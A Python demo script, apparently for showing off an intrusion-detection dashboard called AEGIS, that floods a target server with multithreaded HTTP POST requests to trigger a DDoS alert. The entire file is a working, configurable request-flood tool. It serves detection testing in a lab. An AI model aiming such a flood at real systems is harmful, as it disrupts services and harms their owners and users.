"""
AEGIS Demo — Packet Flood Attack Script
Run this from the ATTACKER laptop.
Usage:
    python attacker_flood.py <SERVER_IP> [--port 8000] [--rate 200] [--duration 30]

Example:
    python attacker_flood.py 192.168.1.10 --rate 300 --duration 20
"""
import argparse
import threading
import time
import urllib.request
import urllib.error
import sys

# ── Config ────────────────────────────────────────────
parser = argparse.ArgumentParser(description="AEGIS Demo Packet Flood Attacker")
parser.add_argument("server_ip", help="IP address of the server laptop")
parser.add_argument("--port",     type=int, default=8000,  help="Server port (default: 8000)")
parser.add_argument("--rate",     type=int, default=200,   help="Requests per second to send (default: 200)")
parser.add_argument("--duration", type=int, default=30,    help="Attack duration in seconds (default: 30)")
parser.add_argument("--threads",  type=int, default=10,    help="Concurrent threads (default: 10)")
args = parser.parse_args()

TARGET_URL  = f"http://{args.server_ip}:{args.port}/demo/flood"
RATE        = args.rate       # req/s total across all threads
DURATION    = args.duration   # seconds
THREADS     = args.threads
DELAY       = THREADS / RATE  # per-thread delay between requests

PAYLOAD = b"X" * 512          # 512-byte dummy payload per request

# ── Shared counters ───────────────────────────────────
sent   = 0
errors = 0
lock   = threading.Lock()
stop   = threading.Event()


def flood():
    global sent, errors
    while not stop.is_set():
        try:
            req = urllib.request.Request(
                TARGET_URL,
                data=PAYLOAD,
                headers={"Content-Type": "application/octet-stream", "Content-Length": str(len(PAYLOAD))},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=2):
                pass
            with lock:
                sent += 1
        except Exception:
            with lock:
                errors += 1
        time.sleep(DELAY)


def status_printer():
    start = time.time()
    while not stop.is_set():
        time.sleep(2)
        elapsed = time.time() - start
        with lock:
            s, e = sent, errors
        rps = s / max(elapsed, 1)
        print(f"  ⚡ {s} requests sent | {rps:.0f} req/s | {e} errors | {elapsed:.0f}s elapsed")


# ── Main ──────────────────────────────────────────────
print("=" * 55)
print("  🔴 AEGIS DEMO — FLOOD ATTACK")
print("=" * 55)
print(f"  Target   : {TARGET_URL}")
print(f"  Rate     : ~{RATE} req/s  ({THREADS} threads)")
print(f"  Duration : {DURATION}s")
print(f"  Payload  : {len(PAYLOAD)} bytes/request")
print("-" * 55)
print("  Watch the AEGIS dashboard — a DDoS alert should")
print("  appear within ~5 seconds of starting the attack.")
print("=" * 55)
print()

threads = [threading.Thread(target=flood, daemon=True) for _ in range(THREADS)]
printer = threading.Thread(target=status_printer, daemon=True)

for t in threads:
    t.start()
printer.start()

try:
    time.sleep(DURATION)
except KeyboardInterrupt:
    print("\n🛑 Stopped by user.")

stop.set()
time.sleep(0.5)
print()
print(f"✅ Attack complete — {sent} requests sent, {errors} errors.")
print("   Check the AEGIS Threats page for the DDoS detection!")
